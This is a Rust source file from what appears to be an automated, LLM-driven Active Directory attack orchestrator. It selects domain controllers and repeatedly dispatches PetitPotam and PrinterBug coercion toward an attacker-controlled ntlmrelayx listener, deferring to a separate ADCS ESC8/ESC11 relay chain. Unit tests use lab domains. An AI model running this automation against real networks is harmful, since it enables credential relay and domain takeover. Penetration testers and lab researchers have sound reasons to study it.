//! auto_coercion -- trigger ESC8 relay and DC coercion.

use std::sync::Arc;
use std::time::Duration;

use tokio::sync::watch;
use tracing::{info, warn};

use crate::orchestrator::dispatcher::Dispatcher;
use crate::orchestrator::state::*;

/// Select the DCs that should be coerced this tick.
///
/// Filters `state.domain_controllers` for entries that:
/// - have not been processed yet (`DEDUP_COERCED_DCS`), and
/// - are not the listener machine itself (a self-coerce loops back to the
///   attacker host and produces nothing), and
/// - are NOT already coerce candidates of an ADCS ESC8/ESC11 vulnerability
///   — those DCs are claimed by `auto_adcs_exploitation`, which drives the
///   coerce via the deterministic `relay_and_coerce` chain with full CA-host
///   context. The LLM-routed coercion task in this module has no CA hint
///   and will return `NO_RELAY_LISTENER`, racing the ADCS chain for the
///   port-445 mutex and burning the dedup slot. Skipping here keeps the
///   ADCS chain unblocked.
///
/// Returns `(domain, dc_ip)` pairs in the same order `domain_controllers`
/// iterates (HashMap order — caller can sort if determinism matters).
///
/// Extracted from `auto_coercion` so the filter logic can be unit-tested
/// without standing up a Dispatcher.
pub(crate) fn select_coercion_work(state: &StateInner, listener_ip: &str) -> Vec<(String, String)> {
    // If ANY ESC8/ESC11 vuln is present, defer all standalone coercion. The
    // ADCS chain claims the port-445 mutex via `relay_chain_semaphore` and
    // owns the coerce surface for every DC in the topology — its
    // `pick_coerce_targets` walks the same DC IPs we'd otherwise hand to the
    // LLM here. A more granular "skip only DCs owned by the chain" filter
    // turned out to misfire on cross-realm topologies: the ESC8 vuln records
    // the CA's enrollment realm in `details["domain"]` (e.g.
    // north.sevenkingdoms.local) while the coerce-target DC's home in
    // `domain_controllers` is the parent realm (sevenkingdoms.local), so a
    // domain-equality test missed the overlap and the LLM coerce raced the
    // chain anyway. Coarse-skip is the safer wire.
    let has_adcs_vuln = state.discovered_vulnerabilities.values().any(|v| {
        let t = v.vuln_type.to_lowercase();
        t.contains("esc8") || t.contains("esc11")
    });
    if has_adcs_vuln {
        return Vec::new();
    }

    state
        .domain_controllers
        .iter()
        .filter(|(_, dc_ip)| !state.is_processed(DEDUP_COERCED_DCS, dc_ip))
        .filter(|(_, dc_ip)| dc_ip.as_str() != listener_ip)
        .map(|(domain, dc_ip)| (domain.clone(), dc_ip.clone()))
        .collect()
}

/// Triggers coercion attacks when ADCS ESC8 servers or unconstrained delegation hosts exist.
/// Interval: 30s.
pub async fn auto_coercion(dispatcher: Arc<Dispatcher>, mut shutdown: watch::Receiver<bool>) {
    let mut interval = tokio::time::interval(Duration::from_secs(30));
    interval.set_missed_tick_behavior(tokio::time::MissedTickBehavior::Delay);

    loop {
        tokio::select! {
            _ = interval.tick() => {},
            _ = shutdown.changed() => break,
        }
        if *shutdown.borrow() {
            break;
        }

        // Resolve listener IP: use the attacker's own IP from config.
        // This is where ntlmrelayx binds — it MUST NOT be a target host.
        let listener = match dispatcher.config.listener_ip.as_deref() {
            Some(ip) => ip.to_string(),
            None => continue, // no listener IP available, skip coercion
        };

        // Coerce DCs that haven't been coerced yet
        let work: Vec<(String, String)> = {
            let state = dispatcher.state.read().await;
            select_coercion_work(&state, &listener)
        };

        for (domain, dc_ip) in work {
            match dispatcher
                .request_coercion(&dc_ip, &listener, &["petitpotam", "printerbug"], &domain)
                .await
            {
                Ok(Some(task_id)) => {
                    info!(task_id = %task_id, dc = %dc_ip, domain = %domain, "DC coercion dispatched");
                    dispatcher
                        .state
                        .write()
                        .await
                        .mark_processed(DEDUP_COERCED_DCS, dc_ip.clone());
                    let _ = dispatcher
                        .state
                        .persist_dedup(&dispatcher.queue, DEDUP_COERCED_DCS, &dc_ip)
                        .await;
                }
                Ok(None) => {}
                Err(e) => warn!(err = %e, "Failed to dispatch coercion"),
            }
        }
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn select_coercion_empty_state() {
        let s = StateInner::new("op".into());
        assert!(select_coercion_work(&s, "192.168.58.1").is_empty());
    }

    #[test]
    fn select_coercion_emits_known_dc() {
        let mut s = StateInner::new("op".into());
        s.domain_controllers
            .insert("contoso.local".into(), "192.168.58.10".into());
        let work = select_coercion_work(&s, "192.168.58.1");
        assert_eq!(
            work,
            vec![("contoso.local".to_string(), "192.168.58.10".to_string())]
        );
    }

    #[test]
    fn select_coercion_excludes_listener_ip() {
        let mut s = StateInner::new("op".into());
        // Listener is the attacker host — self-coerce would loop back.
        s.domain_controllers
            .insert("contoso.local".into(), "192.168.58.1".into());
        assert!(select_coercion_work(&s, "192.168.58.1").is_empty());
    }

    #[test]
    fn select_coercion_skips_already_processed() {
        let mut s = StateInner::new("op".into());
        s.domain_controllers
            .insert("contoso.local".into(), "192.168.58.10".into());
        s.mark_processed(DEDUP_COERCED_DCS, "192.168.58.10".into());
        assert!(select_coercion_work(&s, "192.168.58.1").is_empty());
    }

    #[test]
    fn select_coercion_emits_multiple_dcs() {
        let mut s = StateInner::new("op".into());
        s.domain_controllers
            .insert("contoso.local".into(), "192.168.58.10".into());
        s.domain_controllers
            .insert("fabrikam.local".into(), "192.168.58.40".into());
        let mut work = select_coercion_work(&s, "192.168.58.1");
        work.sort();
        assert_eq!(
            work,
            vec![
                ("contoso.local".to_string(), "192.168.58.10".to_string()),
                ("fabrikam.local".to_string(), "192.168.58.40".to_string()),
            ]
        );
    }

    #[test]
    fn select_coercion_mixed_processed_and_unprocessed() {
        let mut s = StateInner::new("op".into());
        s.domain_controllers
            .insert("contoso.local".into(), "192.168.58.10".into());
        s.domain_controllers
            .insert("fabrikam.local".into(), "192.168.58.40".into());
        s.mark_processed(DEDUP_COERCED_DCS, "192.168.58.10".into());
        let work = select_coercion_work(&s, "192.168.58.1");
        assert_eq!(
            work,
            vec![("fabrikam.local".to_string(), "192.168.58.40".to_string())]
        );
    }

    fn make_esc8_vuln(vuln_id: &str, domain: &str) -> ares_core::models::VulnerabilityInfo {
        let mut details = std::collections::HashMap::new();
        details.insert("domain".into(), serde_json::Value::String(domain.into()));
        ares_core::models::VulnerabilityInfo {
            vuln_id: vuln_id.into(),
            vuln_type: "adcs_esc8".into(),
            target: "192.168.58.10".into(),
            discovered_by: "test".into(),
            discovered_at: chrono::Utc::now(),
            details,
            recommended_agent: String::new(),
            priority: 2,
        }
    }

    #[test]
    fn select_coercion_skips_all_when_any_esc8_vuln_present() {
        let mut s = StateInner::new("op".into());
        s.domain_controllers
            .insert("contoso.local".into(), "192.168.58.10".into());
        s.domain_controllers
            .insert("fabrikam.local".into(), "192.168.58.40".into());
        // ESC8 vuln's `details["domain"]` records the CA's realm (here
        // contoso.local). Even with fabrikam DC in a different realm, the
        // coarse skip defers all standalone coercion until the ADCS chain
        // exhausts the port-445 mutex — the chain's `pick_coerce_targets`
        // walks fabrikam's DC anyway as Tier 2, so the standalone LLM
        // dispatch would race it for the same port.
        s.discovered_vulnerabilities
            .insert("v1".into(), make_esc8_vuln("v1", "contoso.local"));
        assert!(select_coercion_work(&s, "192.168.58.1").is_empty());
    }

    #[test]
    fn select_coercion_skips_for_esc11_too() {
        let mut s = StateInner::new("op".into());
        s.domain_controllers
            .insert("contoso.local".into(), "192.168.58.10".into());
        let mut esc11 = make_esc8_vuln("v1", "contoso.local");
        esc11.vuln_type = "adcs_esc11".into();
        s.discovered_vulnerabilities.insert("v1".into(), esc11);
        assert!(select_coercion_work(&s, "192.168.58.1").is_empty());
    }

    #[test]
    fn select_coercion_skip_holds_even_when_vuln_realm_mismatches_dc_realm() {
        // ESC8 vuln carries the CA's enrollment realm in
        // `details["domain"]` — often the CHILD realm
        // (north.sevenkingdoms.local) while the coerce-target DC's home in
        // `domain_controllers` is the PARENT (sevenkingdoms.local). An
        // earlier domain-equality skip missed this case and the standalone
        // coerce raced the ADCS chain. The coarse skip catches it.
        let mut s = StateInner::new("op".into());
        s.domain_controllers
            .insert("sevenkingdoms.local".into(), "10.1.10.10".into());
        s.discovered_vulnerabilities.insert(
            "v1".into(),
            make_esc8_vuln("v1", "north.sevenkingdoms.local"),
        );
        assert!(select_coercion_work(&s, "10.1.10.167").is_empty());
    }
}
